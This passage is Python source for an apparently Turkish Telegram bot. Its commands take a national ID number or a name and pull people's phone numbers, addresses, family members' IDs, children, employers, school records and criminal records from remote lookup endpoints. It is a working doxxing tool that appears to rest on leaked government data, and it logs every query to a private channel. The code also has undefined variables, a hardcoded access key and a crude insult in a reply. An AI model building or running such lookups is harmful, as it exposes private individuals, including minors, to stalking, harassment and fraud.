        upload_speed = data['speeds']['upload']  # Mbps
        latency = data['latency']  # ms
        
        response_message = (
            f"İndirme Hızı: {download_speed:.2f} Mbps\n"
            f"Yükleme Hızı: {upload_speed:.2f} Mbps\n"
            f"Gecikme: {latency} ms"
        )
        bot.send_message(message.chat.id, response_message)
    except Exception as e:
        bot.send_message(message.chat.id, f"Speedtest sırasında bir hata oluştu: {e}")

@bot.message_handler(commands=["tcgsm"])
def tcgsm_sorgula(message):
    

    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Lütfen bir TC numarası girin.")
        return

    cevap = "╭━━━━━━━━━━━━━╮\n┃➥ @BotAltyapi\n╰━━━━━━━━━━━━━╯"
    text = message.text.split()[1]  
    api_url = f"http://localhost/yunus/tcgsm.php?tc={text}"
    response = requests.get(api_url)
    data = response.json()

    if data.get("success", False) and "data" in data and len(data["data"]) > 0:
        people = data["data"]
        info = ""
        for person in people:
            tc = person.get("TC")
            gsm = person.get("GSM")
            
            info += f"""
╭━━━━━━━━━━━━━━━━╮
┃➥ TC: {tc}
┃➥ GSM: {gsm}
╰━━━━━━━━━━━━━━━━╯"""
        cevap += info
        bot.send_message(message.chat.id, cevap)

        log_message = f"Yeni TC GSM Sorgu Atıldı!\n" \
                      f"Sorgulanan TC: {text}\n" \
                      f"Sorgulayan ID: {user_id}\n" \
                      f"Sorgulayan Adı: {user_name}\n" \
                      f"Sorgulayan K. Adı: @{message.from_user.username}"
        bot.send_message(-1002228388312, log_message)  
    else:
        bot.send_message(message.chat.id, "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖬ı\n╰────────────╯")


import requests




import requests
import json

import requests
DATA_URL = 'https://tsgchecker.tsgmods.com.tr/yunus/cocuk.php'  # Veri sağlayıcı URL'si   
@bot.message_handler(commands=['cocuk'])
def query_child_info(message):
    
    try:
        chat_id = message.chat.id
        if len(message.text.split()) == 2:
            _, tc = message.text.split()
            params = {'tc': tc}
            response = requests.get(DATA_URL, params=params)
            if response.status_code == 200:
                data = response.json()
                if 'success' in data and data['success'] == 'true' and 'data' in data:
                    child_data = data['data']
                    filename = f'cocuk_bilgileri.txt'
                    with open(filename, 'w', encoding='utf-8') as f:
                        for idx, entry in enumerate(child_data, 1):
                            if entry['Yakınlık'] == 'Kendisi':
                                title = 'Kendisi'
                            else:
                                title = f"Çocuk Bilgisi {idx}"
                            f.write(f"{'='*30}\n")
                            f.write(f"{title}\n")
                            f.write(f"{'='*30}\n")
                            f.write(f"ID: {entry['ID']}\n")
                            f.write(f"TC: {entry['TC']}\n")
                            f.write(f"Adı: {entry['AD']}\n")
                            f.write(f"Soyadı: {entry['SOYAD']}\n")
                            f.write(f"GSM: {entry['GSM'] if entry['GSM'] else '-'}\n")
                            f.write(f"Baba Adı: {entry['BABAADI']}\n")
                            f.write(f"Baba TC: {entry['BABATC']}\n")
                            f.write(f"Anne Adı: {entry['ANNEADI']}\n")
                            f.write(f"Anne TC: {entry['ANNETC']}\n")
                            f.write(f"Doğum Tarihi: {entry['DOGUMTARIHI']}\n")
                            f.write(f"Ölüm Tarihi: {entry['OLUMTARIHI']}\n")
                            f.write(f"Doğum Yeri: {entry['DOGUMYERI']}\n")
                            f.write(f"Memleket İl: {entry['MEMLEKETIL']}\n")
                            f.write(f"Memleket İlçe: {entry['MEMLEKETILCE']}\n")
                            f.write(f"Memleket Köy: {entry['MEMLEKETKOY']}\n")
                            f.write(f"Adres: {entry['ADRESIL']} {entry['ADRESILCE']}\n")
                            f.write(f"Aile Sıra No: {entry['AILESIRANO']}\n")
                            f.write(f"Birey Sıra No: {entry['BIREYSIRANO']}\n")
                            f.write(f"Medeni Hal: {entry['MEDENIHAL']}\n")
                            f.write(f"Cinsiyet: {entry['CINSIYET']}\n")
                            f.write(f"Yakınlık: {entry['Yakınlık']}\n")
                            f.write("\n")
                    # Dosyayı kullanıcıya gönder
                    with open(filename, 'rb') as f:
                        bot.send_document(chat_id, f)
                    # Dosyayı sil
                    os.remove(filename)
                else:
                    bot.reply_to(message, "Belirtilen TC kimlik numarasıyla ilgili bilgi bulunamadı.")
            else:
                bot.reply_to(message, "Veri sağlayıcıdan bilgi alınırken bir hata oluştu.")
        else:
            bot.reply_to(message, "Lütfen TC kimlik numarasını doğru formatta giriniz. Örneğin: /cocuk 11111111110")
    except Exception as e:
        print(f"Hata: {e}")
        bot.reply_to(message, "İşlem sırasında bir hata oluştu.")

import requests

@bot.message_handler(commands=['kuzen'])
def kuzen_bilgileri(message):
    # Komuttan sonra gelen metni al (TC kimlik numarası)
    if len(message.text.split()) != 2:
        bot.reply_to(message, "Lütfen geçerli bir TC kimlik numarası girin.")
        return
    
    tc_no = message.text.split()[1]
    url = f'https://tsgchecker.tsgmods.com.tr/yunus/kuzen.php?tc={tc_no}'
    
    try:
        # Veriyi URL üzerinden al
        response = requests.get(url)
        data = json.loads(response.text)
        
        # Dosyaya yaz
        with open('kuzen_bilgileri.txt', 'a', encoding='utf-8') as file:
            file.write(f"TC Kimlik Numarası: {data['TC']}\n")
            file.write(f"Adı: {data['AD']}\n")
            file.write(f"Soyadı: {data['SOYAD']}\n")
            file.write(f"Baba Adı: {data['BABAADI']}\n")
            file.write(f"Baba TC: {data['BABATC']}\n")
            file.write(f"Anne Adı: {data['ANNEADI']}\n")
            file.write(f"Anne TC: {data['ANNETC']}\n")
            file.write(f"Doğum Tarihi: {data['DOGUMTARIHI']}\n")
            file.write(f"Ölüm Tarihi: {data['OLUMTARIHI']}\n")
            file.write(f"Doğum Yeri: {data['DOGUMYERI']}\n")
            file.write(f"Memleket İl: {data['MEMLEKETIL']}\n")
            file.write(f"Memleket İlçe: {data['MEMLEKETILCE']}\n")
            file.write(f"Memleket Köy: {data['MEMLEKETKOY']}\n")
            file.write(f"Adres İl: {data['ADRESIL']}\n")
            file.write(f"Adres İlçe: {data['ADRESILCE']}\n")
            file.write(f"Aile Sıra No: {data['AILESIRANO']}\n")
            file.write(f"Birey Sıra No: {data['BIREYSIRANO']}\n")
            file.write(f"Medeni Hal: {data['MEDENIHAL']}\n")
            file.write(f"Cinsiyet: {data['CINSIYET']}\n")
            file.write(f"Yakınlık: {data['yakinlik']}\n\n")
        
        # Kullanıcıya dosyayı gönder
        with open('kuzen_bilgileri.txt', 'rb') as file:
            bot.send_document(message.chat.id, file)
        
        # Kullanıcıya geri bildirim ver
        bot.reply_to(message, "Kuzen bilgileri başarıyla kaydedildi ve size gönderildi.")
        
    except Exception as e:
        print(f"Hata oluştu: {e}")
        bot.reply_to(message, "Bir hata oluştu, lütfen daha sonra tekrar deneyin.")

@bot.message_handler(commands=['inx'])
def index(message):
    
    
    
    

 
    try:
        site_url = message.text.split(maxsplit=1)[1]
    except IndexError:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, "*⚠️ Lütfen Geçerli Bir Site URL girin!*\n\n*Örnek:* `/index https://e-okul.meb.gov.tr`", parse_mode="Markdown")
        return

    if not site_url.startswith("http://") and not site_url.startswith("https://"):
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, "*⚠️ Üzgünüm Hatalı URL girdiniz Lütfen geçerli bir URL girin*\n\n*Örnek*: `/index https://e-okul.meb.gov.tr`", parse_mode="Markdown")
        return

    response = requests.get(site_url)

    if response.status_code == 200:
        file_name = "@TSGChecker.html"
        file_content = response.text
        increment_query_count()
        with open(file_name, 'w') as file:
            file.write(file_content)

        with open(file_name, 'rb') as file:
            bot.send_chat_action(message.chat.id, 'typing')
            time.sleep(0.1)
            bot.send_document(message.chat.id, file)

        os.remove(file_name)
    else:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, "*⚠️ Üzgünüm bu siteye Ait Bir index Çekilemiyor!*", parse_mode='Markdown')














def log_sorgu(user_name, ad, soyad, il):
    # Sorgulama bilgilerini loglama işlemi
    log_data = {
        'user_name': user_name,
        'ad': ad,
        'soyad': soyad,
        'il': il
    }
    
    # Log bilgilerini log kanalına gönderme
    log_channel_id = "-1002245175746"  # Log kanalının ID'si
    log_message = f"Sorgulayan: {user_name}\nYeni Ad-Soyad-İl Sorgusu: {ad} {soyad} {il}"
    bot.send_message(log_channel_id, log_message)








@bot.message_handler(commands=['adsoyadil'])
def get_adsoyadil_info(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "Banlı kullanıcılar bu hizmetten yararlanamaz.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 4:
            bot.reply_to(message, "Lütfen bir ad, soyad ve il giriniz. Örnek kullanım: /adsoyadil <ad> <soyad> <il>")
            return
        
        ad = parts[1]
        soyad = parts[2]
        il = parts[3]
        url = f"https://tsgchecker.tsgmods.com.tr/yunus/adsoyadil.php?ad={ad}&soyad={soyad}&il={il}"
        response = requests.get(url)
        data = response.json()
        
        if not data['success']:
            bot.reply_to(message, "Veri bulunamadı.")
            return

        file_name = f"{ad}_{soyad}_bilgisi.txt"
        with open(file_name, "w", encoding="utf-8") as file:
            for entry in data['data']:
                file.write("╭━━━━━━━━━━━━━━\n")
                file.write(f"┃ ID: {entry['ID']}\n")
                file.write(f"┃ TC: {entry['TC']}\n")
                file.write(f"┃ Ad: {entry['AD']}\n")
                file.write(f"┃ Soyad: {entry['SOYAD']}\n")
                file.write(f"┃ GSM: {entry['GSM'] or 'Bilinmiyor'}\n")
                file.write(f"┃ Baba Adı: {entry['BABAADI']} Baba TC: {entry['BABATC']}\n")
                file.write(f"┃ Anne Adı: {entry['ANNEADI']} Anne TC: {entry['ANNETC']}\n")
                file.write(f"┃ Doğum Tarihi: {entry['DOGUMTARIHI']} Ölüm Tarihi: {entry['OLUMTARIHI']}\n")
                file.write(f"┃ Doğum Yeri: {entry['DOGUMYERI']}\n")
                file.write(f"┃ Memleket İl: {entry['MEMLEKETIL']} İlçe: {entry['MEMLEKETILCE']} Köy: {entry['MEMLEKETKOY']}\n")
                file.write(f"┃ Adres İl: {entry['ADRESIL']} İlçe: {entry['ADRESILCE']}\n")
                file.write(f"┃ Aile Sıra No: {entry['AILESIRANO']} Birey Sıra No: {entry['BIREYSIRANO']}\n")
                file.write(f"┃ Medeni Hal: {entry['MEDENIHAL']} Cinsiyet: {entry['CINSIYET']}\n")
                file.write("╰━━━━━━━━━━━━━━\n")
        
        with open(file_name, "rb") as file:
            bot.send_document(message.chat.id, file)

        os.remove(file_name)  # Dosyayı gönderdikten sonra sil

    except IndexError:
        bot.reply_to(message, "Lütfen bir ad, soyad ve il giriniz. Örnek kullanım: /adsoyadil <ad> <soyad> <il>")
    except requests.exceptions.RequestException:
        bot.reply_to(message, "Veri sağlayıcıya ulaşılamıyor. Lütfen daha sonra tekrar deneyin.")
    except KeyError:
        bot.reply_to(message, "Veri formatı beklenmedik biçimde geldi. Lütfen daha sonra tekrar deneyin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")

    bot.delete_message(chat_id, initial_message.message_id)
    
    
    
    
    
@bot.message_handler(commands=['adsoyad'])
def get_adsoyad_info(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "Banlı kullanıcılar bu hizmetten yararlanamaz.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "Lütfen bir ad ve soyad giriniz. Örnek kullanım: /adsoyad <ad> <soyad>")
            return

        ad = parts[1]
        soyad = parts[2]
        url = f"https://tsgchecker.tsgmods.com.tr/yunus/adsoyad.php?ad={ad}&soyad={soyad}"
        response = requests.get(url)
        data = response.json()
        
        if not data['success']:
            bot.reply_to(message, "Veri bulunamadı.")
            return

        file_name = f"{ad}_{soyad}_bilgisi.txt"
        with open(file_name, "w", encoding="utf-8") as file:
            for entry in data['data']:
                file.write("╭━━━━━━━━━━━━━━\n")
                file.write(f"┃ ID: {entry['ID']}\n")
                file.write(f"┃ TC: {entry['TC']}\n")
                file.write(f"┃ Ad: {entry['AD']}\n")
                file.write(f"┃ Soyad: {entry['SOYAD']}\n")
                file.write(f"┃ GSM: {entry['GSM'] or 'Bilinmiyor'}\n")
                file.write(f"┃ Baba Adı: {entry['BABAADI']} Baba TC: {entry['BABATC']}\n")
                file.write(f"┃ Anne Adı: {entry['ANNEADI']} Anne TC: {entry['ANNETC']}\n")
                file.write(f"┃ Doğum Tarihi: {entry['DOGUMTARIHI']} Ölüm Tarihi: {entry['OLUMTARIHI']}\n")
                file.write(f"┃ Doğum Yeri: {entry['DOGUMYERI']}\n")
                file.write(f"┃ Memleket İl: {entry['MEMLEKETIL']} İlçe: {entry['MEMLEKETILCE']} Köy: {entry['MEMLEKETKOY']}\n")
                file.write(f"┃ Adres İl: {entry['ADRESIL']} İlçe: {entry['ADRESILCE']}\n")
                file.write(f"┃ Aile Sıra No: {entry['AILESIRANO']} Birey Sıra No: {entry['BIREYSIRANO']}\n")
                file.write(f"┃ Medeni Hal: {entry['MEDENIHAL']} Cinsiyet: {entry['CINSIYET']}\n")
                file.write("╰━━━━━━━━━━━━━━\n")
        
        with open(file_name, "rb") as file:
            bot.send_document(message.chat.id, file)

        os.remove(file_name)  # Dosyayı gönderdikten sonra sil

    except IndexError:
        bot.reply_to(message, "Lütfen bir ad ve soyad giriniz. Örnek kullanım: /adsoyad <ad> <soyad>")
    except requests.exceptions.RequestException:
        bot.reply_to(message, "Veri sağlayıcıya ulaşılamıyor. Lütfen daha sonra tekrar deneyin.")
    except KeyError:
        bot.reply_to(message, "Veri formatı beklenmedik biçimde geldi. Lütfen daha sonra tekrar deneyin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")
        
gpt_active = False  # GPT-3 API'den cevap alma durumu
gpt_active_chats = {}  # Sohbetlerin GPT-3 cevap alma durumlarını tutacak sözlük

def get_response(question):
    try:
        response = requests.get(f"https://tilki.dev/api/hercai?soru={question}").json()
        return response.get("cevap", "Üzgünüm, cevap bulunamadı.")
    except:
        return "Üzgünüm, API'den cevap alınamadı."

def is_admin(user_id, chat_id):
    member = bot.get_chat_member(chat_id, user_id)
    return member.status in ["creator", "administrator"]

@bot.message_handler(commands=['gptac'])
def activate_gpt(message):
    
    chat_id = message.chat.id
    user_id = message.from_user.id
    if is_admin(user_id, chat_id):
        gpt_active_chats[chat_id] = True
        bot.reply_to(message, "GPT-3 cevapları aktif hale getirildi.")
    else:
        bot.reply_to(message, "Bu komutu yalnızca sohbet yöneticileri kullanabilir.")

@bot.message_handler(commands=['gptkapat'])
def deactivate_gpt(message):
    
    chat_id = message.chat.id
    user_id = message.from_user.id
    if is_admin(user_id, chat_id):
        if chat_id in gpt_active_chats:
            del gpt_active_chats[chat_id]
            bot.reply_to(message, "GPT-3 cevapları kapatıldı.")
        else:
            bot.reply_to(message, "GPT-3 cevapları zaten kapalı.")
    else:
        bot.reply_to(message, "Bu komutu yalnızca sohbet yöneticileri kullanabilir.")

@bot.message_handler(func=lambda m: gpt_active_chats.get(m.chat.id, False))
def handle_messages(message):
    if 'yunus' in message.text.lower():
        bot.reply_to(message, "@BotAltyapi kanalına katılmayı unutma")
    else:
        response = get_response(message.text)
        bot.reply_to(message, response)


def calculate_child_height(mother_height, father_height, gender):
    if gender.lower() == 'erkek':
        return (mother_height + father_height + 0.13) / 2
    elif gender.lower() == 'kız':
        return (mother_height + father_height - 0.13) / 2
    else:
        return None






API_URL = 'https://tsgchecker.tsgmods.com.tr/yunus/tg.php'



@bot.message_handler(commands=['bilgi'])
def send_user_info(message):
    # Extract username from the command
    if len(message.text.split()) > 1:
        username = message.text.split()[1]
        # Make API request to fetch user information
        response = requests.get(API_URL, params={'username': username})
        
        if response.status_code == 200:
            # Parse the response JSON
            user_info = response.json()
            
            # Format the response message with user info
            info_message = f"Kullanıcı Adı: {user_info.get('KullaniciAdi')}\nAd Soyad: {user_info.get('AdSoyad')}\nBiografi: {user_info.get('Biografi')}"
            
            # Check if profile photo exists
            if 'ProfilFotografi' in user_info:
                base64_photo = user_info['ProfilFotografi']
                if base64_photo == "Profil fotoğrafı bulunamadı.":
                    info_message += "\nProfil Fotoğrafı: Bulunamadı."
                else:
                    # Decode and send the image
                    image_data = base64.b64decode(base64_photo)
                    image = Image.open(BytesIO(image_data))
                    bot.send_photo(message.chat.id, image)
            else:
                info_message += "\nProfil Fotoğrafı: Bulunamadı."
        else:
            info_message = "Kullanıcı bilgileri alınamadı."
    else:
        info_message = "Kullanıcı adını belirtmek için /bilgi komutunu kullanın."
    
    # Send the message back to the user
    bot.reply_to(message, info_message)
@bot.message_handler(commands=['boy'])
def handle_boy_command(message):
    try:
        parts = message.text.split()
        
        if len(parts) != 4:
            bot.reply_to(message, "Lütfen komutu şu formatta girin: /boy annenin_boyu babanın_boyu cinsiyet (örnek: /boy 1.55 1.75 kız)")
            return

        command, mother_height_str, father_height_str, gender = parts

        # Boyları kontrol ediyoruz
        mother_height = float(mother_height_str)
        father_height = float(father_height_str)

        if not (0.5 <= mother_height <= 2.5) or not (0.5 <= father_height <= 2.5):
            bot.reply_to(message, "Lütfen geçerli boylar girin (örneğin 0.5 ile 2.5 metre arasında).")
            return

        # Çocuğun boyunu hesaplıyoruz
        child_height = calculate_child_height(mother_height, father_height, gender)
        
        if child_height is not None:
            bot.reply_to(message, f"Çocuğun tahmini boyu: {child_height:.2f} metre")
        else:
            bot.reply_to(message, "Geçersiz cinsiyet. Lütfen 'erkek' veya 'kız' girin.")
    
    except ValueError:
        bot.reply_to(message, "Lütfen komutu şu formatta girin: /boy annenin_boyu babanın_boyu cinsiyet (örnek: /boy 1.55 1.75 kız)")
    except Exception as e:
        bot.reply_to(message, "Bir hata oluştu. Lütfen tekrar deneyin.")

# /isyeri komutu
@bot.message_handler(commands=['isyeri'])
def handle_isyeri(message):
    
    parts = message.text.split()
    if len(parts) == 2:
        tc = parts[1]
        
        url = f"https://tsgchecker.tsgmods.com.tr/yunus/isyeri.php?tc={tc}"
        response = requests.get(url)
        
        if response.status_code == 200:
            try:
                result = json.loads(response.content.decode('utf-8-sig'))  # UTF-8 BOM sorununu çözmek için utf-8-sig kullan
                
                if result.get("success"):
                    data = result.get("data", {})
                    # Veriyi formatlama
                    msg = (
                        f"**İşyeri Bilgileri**\n"
                        f"İşyeri Ünvanı: {data.get('isyeriUnvani')}\n"
                        f"SGK Sicil No: {data.get('isyeriSgkSicilNo')}\n"
                        f"Tehlike Sınıfı: {data.get('isyeriTehlikeSinifi')}\n"
                        f"Nace Kodu: {data.get('isyeriNaceKodu')}\n"
                        f"Sektör: {data.get('isyeriSektoru')}\n\n"
                        
                        f"**Çalışan Bilgileri**\n"
                        f"Ad Soyad: {data.get('calisanAdSoyad')}\n"
                        f"Kimlik No: {data.get('calisanKimlikNo')}\n"
                        f"Çalışma Durumu: {data.get('calismaDurumu')}\n"
                        f"İşe Giriş Tarihi: {data.get('iseGirisTarihi')}\n\n"
                        
                        f"**Diğer Bilgiler**\n"
                        f"İs Aktif Mi: {data.get('isActv')}\n"
                        f"Belge Türü: {data.get('belgeTur')}\n"
                        f"ID: {data.get('id')}"
                    )
                    bot.reply_to(message, msg, parse_mode="Markdown")
                else:
                    bot.reply_to(message, "Bilgiler alınamadı, lütfen tekrar deneyin.")
            except json.JSONDecodeError as e:
                bot.reply_to(message, "Gelen veriler işlenemedi, lütfen tekrar deneyin.")
        else:
            bot.reply_to(message, "Bilgiler alınamadı, lütfen tekrar deneyin.")
    else:
        bot.reply_to(message, "Lütfen /isyeri komutunu TC kimlik numarası ile birlikte kullanın. Örnek: /isyeri 11144576054")



@bot.message_handler(commands=['eokul'])
def handle_eokul(message):
    
    parts = message.text.split()
    if len(parts) == 2:
        tc = parts[1]
        
        url = f"https://tsgchecker.tsgmods.com.tr/yunus/eokul.php?auth=tesegex&tc={tc}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            # Veriyi formatlama
            msg = (
                f"ID: {data['id']}\n"
                f"TC: {data['TC']}\n"
                f"Okul No: {data['OKULNO']}\n"
                f"Adı: {data['ADI']}\n"
                f"Soyadı: {data['SOYADI']}\n"
                f"Durum: {data['DURUM']}"
            )
            bot.reply_to(message, msg)
        else:
            bot.reply_to(message, "Bilgiler alınamadı, lütfen tekrar deneyin.")
    else:
        bot.reply_to(message, "Lütfen /eokul komutunu TC kimlik numarası ile birlikte kullanın. Örnek: /eokul 10005215262")




@bot.message_handler(commands=['yegen'])
def get_yegen_info(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "Banlı kullanıcılar bu hizmetten yararlanamaz.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Lütfen bir TC numarası giriniz. Örnek kullanım: /yegen <TC>")
            return

        tc = parts[1]
        url = f"https://tsgchecker.tsgmods.com.tr/yunus/yegen.php?tc={tc}"
        response = requests.get(url)
        data = response.json()

        if not data['success']:
            bot.reply_to(message, "Veri bulunamadı.")
            return

        info = data['info']
        kendisi = data.get('', [])
        yegenler = data.get('Yeğenler', [])
        cocuklar = data.get('Çocuklar', [])

        info_text = (
            f"Telegram: @BotAltyapi\n"
            f"Kanal Chat: @BotAltyapiChat\n"
            f"Kendisi: {info['Kendisi']}\n"
            f"Yeğenler: {info['Yeğenler']}\n"
            f"Çocuklar: {info['Çocuklar']}\n"
        )

        kendisi_text = "\n".join(["""```python
print("Asko yukarıdaki kanallara katılmayı unutma yeğen bilgileri aşağıda")```"""
            for entry in kendisi
        ])

        yegenler_text = "\n".join([
            f"{entry['Yakinlik']}\n"
            f"ID: {entry['ID']}\n"
            f"TC: {entry['TC']}\n"
            f"AD: {entry['AD']}\n"
            f"SOYAD: {entry['SOYAD']}\n"
            f"GSM: {entry['GSM'] or 'Bilinmiyor'}\n"
            f"BABAADI: {entry['BABAADI']} BABATC: {entry['BABATC']}\n"
            f"ANNEADI: {entry['ANNEADI']} ANNETC: {entry['ANNETC']}\n"
            f"DOGUMTARIHI: {entry['DOGUMTARIHI']} OLUMTARIHI: {entry['OLUMTARIHI']}\n"
            f"DOGUMYERI: {entry['DOGUMYERI']}\n"
            f"MEMLEKETIL: {entry['MEMLEKETIL']} MEMLEKETILCE: {entry['MEMLEKETILCE']} MEMLEKETKOY: {entry['MEMLEKETKOY']}\n"
            f"ADRESIL: {entry['ADRESIL']} ADRESILCE: {entry['ADRESILCE']}\n"
            f"AILESIRANO: {entry['AILESIRANO']} BIREYSIRANO: {entry['BIREYSIRANO']}\n"
            f"MEDENIHAL: {entry['MEDENIHAL']} CINSIYET: {entry['CINSIYET']}\n"
            for entry in yegenler
        ])

        cocuklar_text = "\n".join([
            f"{entry['Yakinlik']}\n"
            f"ID: {entry['ID']}\n"
            f"TC: {entry['TC']}\n"
            f"AD: {entry['AD']}\n"
            f"SOYAD: {entry['SOYAD']}\n"
            f"GSM: {entry['GSM'] or 'Bilinmiyor'}\n"
            f"BABAADI: {entry['BABAADI']} BABATC: {entry['BABATC']}\n"
            f"ANNEADI: {entry['ANNEADI']} ANNETC: {entry['ANNETC']}\n"
            f"DOGUMTARIHI: {entry['DOGUMTARIHI']} OLUMTARIHI: {entry['OLUMTARIHI']}\n"
            f"DOGUMYERI: {entry['DOGUMYERI']}\n"
            f"MEMLEKETIL: {entry['MEMLEKETIL']} MEMLEKETILCE: {entry['MEMLEKETILCE']} MEMLEKETKOY: {entry['MEMLEKETKOY']}\n"
            f"ADRESIL: {entry['ADRESIL']} ADRESILCE: {entry['ADRESILCE']}\n"
            f"AILESIRANO: {entry['AILESIRANO']} BIREYSIRANO: {entry['BIREYSIRANO']}\n"
            f"MEDENIHAL: {entry['MEDENIHAL']} CINSIYET: {entry['CINSIYET']}\n"
            for entry in cocuklar
        ])

        response_text = (
            f"Bilgi:\n{info_text}\n\n"
            f"Kendisi:\n{kendisi_text}\n\n"
            f"Yeğenler:\n{yegenler_text}\n\n"
            f"Çocuklar:\n{cocuklar_text}"
        )

        bot.reply_to(message, response_text)

    except IndexError:
        bot.reply_to(message, "Lütfen bir TC numarası giriniz. Örnek kullanım: /yegen <TC>")
    except requests.exceptions.RequestException:
        bot.reply_to(message, "Veri sağlayıcıya ulaşılamıyor. Lütfen daha sonra tekrar deneyin.")
    except KeyError:
        bot.reply_to(message, "Veri formatı beklenmedik biçimde geldi. Lütfen daha sonra tekrar deneyin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")



@bot.message_handler(commands=['sicil'])
def get_sicil_info(message):
    if is_user_banned(message.from_user.id):
        bot.reply_to(message, "Banlı kullanıcılar bu hizmetten yararlanamaz.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "Lütfen bir TC numarası giriniz. Örnek kullanım: /sicil <TC>")
            return

        tc = parts[1]
        url = f"https://tsgchecker.tsgmods.com.tr/yunus/sicil.php?tc={tc}"
        response = requests.get(url)
        data = response.json()

        if not data:
            bot.reply_to(message, "Veri bulunamadı.")
            return

        sicil_info = (
            f"ISIM: {data['ISIM']}\n"
            f"SOYISIM: {data['SOYISIM']}\n"
            f"SAYI: {data['SAYI']}\n"
            f"SORGUTURU: {data['SORGUTURU']}\n"
            f"KIMLIKTURU: {data['KIMLIKTURU']}\n"
            f"KIMLIKNO: {data['KIMLIKNO']}\n"
            f"SICILKAYIT: {data['SICILKAYIT']}\n"
            f"SICILINISLENDIGIYER: {data['SICILINISLENDIGIYER']}\n"
            "\nINFO:\n"
            f"Telegram: {data['INFO']['Telegram']}\n"
            f"YAPIMCI: {data['INFO']['YAPIMCI']}\n"
            f"API: {data['INFO']['API']}\n"
        )

        bot.reply_to(message, sicil_info)

    except IndexError:
        bot.reply_to(message, "Lütfen bir TC numarası giriniz. Örnek kullanım: /sicil <TC>")
    except requests.exceptions.RequestException:
        bot.reply_to(message, "Veri sağlayıcıya ulaşılamıyor. Lütfen daha sonra tekrar deneyin.")
    except KeyError:
        bot.reply_to(message, "Veri formatı beklenmedik biçimde geldi. Lütfen daha sonra tekrar deneyin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")

# BOT AKTİF EDİLDİ...






@bot.message_handler(commands=['yaz'])
def yaz_command(message):
    
    
    
    try:
        
        text = message.text.replace('/yaz ', '')

        
        formatted_text = text.replace(' ', '%20')

        
        api_url = f'http://apis.xditya.me/write?text={formatted_text}'

        
        response = requests.get(api_url)

        if response.status_code == 200:
            
            bot.send_photo(message.chat.id, photo=("@TSGChecker.jpg", response.content))
        else:
            bot.reply_to(message, 'yarrami ye.')

    except Exception as e:
        bot.reply_to(message, 'sg')



import requests


def is_user_member(user_id, chat_id):
    pass




    


import requests
import os

import requests
def iban_bilgileri(iban):
    url = "https://tsgchecker.tsgmods.com.tr/yunus/iban.php"
    params = {"iban": iban}
    response = requests.get(url, params=params)
    
    if response.status_code == 200:
        data = response.json()
        return data
    else:
        return None

@bot.message_handler(commands=['iban'])
def handle_iban(message):
    iban = message.text[len('/iban '):].strip()
    if not iban:
        bot.reply_to(message, "Lütfen bir IBAN numarası girin. Örnek: /iban TR060004600002888000835781")
        return

    bilgiler = iban_bilgileri(iban)
    
    if bilgiler:
        banka_bilgileri = (
            f"🏦 <b>BANKA BİLGİLERİ</b> 🏦\n"
            f"Adı: <b>{bilgiler['BANKA']['Adı']}</b>\n"
            f"Kod: <b>{bilgiler['BANKA']['Kod']}</b>\n"
            f"Swift: <b>{bilgiler['BANKA']['Swift']}</b>\n"
            f"Hesap No: <b>{bilgiler['BANKA']['Hesap No']}</b>\n"
        )
        
        sube_bilgileri = (
            f"\n🏢 <b>ŞUBE BİLGİLERİ</b> 🏢\n"
            f"Adı: <b>{bilgiler['ŞUBE']['Ad']}</b>\n"
            f"Kod: <b>{bilgiler['ŞUBE']['Kod']}</b>\n"
            f"İl: <b>{bilgiler['ŞUBE']['İl']}</b>\n"
            f"İlçe: <b>{bilgiler['ŞUBE']['İlçe']}</b>\n"
            f"Tel: <b>{bilgiler['ŞUBE']['Tel']}</b>\n"
            f"Fax: <b>{bilgiler['ŞUBE']['Fax']}</b>\n"
            f"Adres: <b>{bilgiler['ŞUBE']['Adres']}</b>\n"
        )
        
        bot.reply_to(message, banka_bilgileri + sube_bilgileri, parse_mode='HTML')
    else:
        bot.reply_to(message, "IBAN bilgileri alınamadı. Lütfen geçerli bir IBAN numarası girin.")

from fake_email import Email
from rich.console import Console

user_data = {}


@bot.message_handler(commands=["mail"])
def start_handler(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    if str(user_id) in ban_list:
        bot.send_message(chat_id, "Bu botu kullanma izniniz yok.")
        return

    email_obj = Email() 
    email_info = email_obj.Mail()  
    user_data[user_id] = {
        "email": email_info["mail"],
        "session": email_info["session"]
    }
    email_address = user_data[user_id]["email"]
    inbox_messages = Email(user_data[user_id]["session"]).inbox()
    
    info = f"E-posta: {email_address}\nGelen Mesajlar: {inbox_messages or 'Yeni mesaj yok'}"
    bot.send_message(chat_id, info)

    if inbox_messages:
        bot.send_message(chat_id, "Yeni bir e-posta geldi!")

@bot.message_handler(commands=['refresh'])
def refresh_handler(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    if str(user_id) in ban_list:
        bot.send_message(chat_id, "Bu botu kullanma izniniz yok.")
        return

    if user_id in user_data:
        email_address = user_data[user_id]["email"]
        inbox_messages = Email(user_data[user_id]["session"]).inbox()
        info = f"E-posta: {email_address}\nGelen Mesajlar: {inbox_messages or 'Yeni mesaj yok'}"
        bot.send_message(chat_id, info)
    else:
        bot.send_message(chat_id, "Önce /mail komutunu kullanarak başlamalısınız.")

    import telebot
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from io import BytesIO
import requests


def is_user_member(user_id, chat_id):
    try:
